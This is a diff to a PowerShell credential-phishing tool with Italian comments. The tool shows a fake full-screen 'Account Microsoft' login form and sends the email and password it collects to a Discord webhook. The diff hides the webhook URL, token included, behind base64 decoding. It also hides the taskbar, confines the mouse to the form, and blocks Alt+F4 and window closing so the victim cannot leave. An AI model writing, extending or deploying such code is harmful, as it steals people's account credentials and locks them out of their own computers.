@@ -3,8 +3,8 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 # ===== WEBHOOK DISCORD =====
-$webhookUrl = "https://discord.com/api/webhooks/1529904963415834634/0kempgpHBEvLgDayfv3zLV_h3cJ7C67FXEsbfhnrT_Bg20YKb1mcFnBOCW0h3iP9tsUA"
-
+$webhookUrlex = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyOTkwNDk2MzQxNTgzNDYzNC8wa2VtcGdwSEJFdkxnRGF5ZnYzekxWX2gzY0o3QzY3RlhFc2JmaG5yVF9CZzIwWUtiMW1jRm5CT0NXMGgzaVA5dHNVQQ=='
+$webhookUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($webhookUrlex))
 # ===== FUNZIONE INVIO A DISCORD =====
 function Send-DiscordMessage {
     param($Email, $Password)
@@ -47,6 +47,9 @@ $form.TopMost = $true
 $form.BackColor = [System.Drawing.Color]::Black
 $form.KeyPreview = $true
 
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen
+$form.Bounds = $screen.Bounds
+
 # Blocca Alt+F4 e altri tasti
 $form.Add_KeyDown({
     if ($_.Alt -and $_.KeyCode -eq 'F4') { $_.SuppressKeyPress = $true }
@@ -58,6 +61,14 @@ $form.Add_KeyDown({
 $form.Add_FormClosing({
     if ($_.CloseReason -eq 'UserClosing') { $_.Cancel = $true }
 })
+
+$taskbarHandle = [Win32.User32]::FindWindow("Shell_TrayWnd", $null)
+if ($taskbarHandle -ne [IntPtr]::Zero) {
+    [Win32.User32]::ShowWindow($taskbarHandle, 0)  # SW_HIDE = 0
+}
+
+[System.Windows.Forms.Cursor]::Clip = $form.Bounds
+
 
 # ===== CALCOLA IL CENTRO DELLO SCHERMO =====
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen
@@ -138,7 +149,7 @@ $y += 70
 
 # Campo Email
 $emailLabel = New-Object System.Windows.Forms.Label
-$emailLabel.Text = "Account Microsoft (email):"
+$emailLabel.Text = "Account Microsoft / (email):"
 $emailLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11)
 $emailLabel.ForeColor = [System.Drawing.Color]::White
 $emailLabel.AutoSize = $true
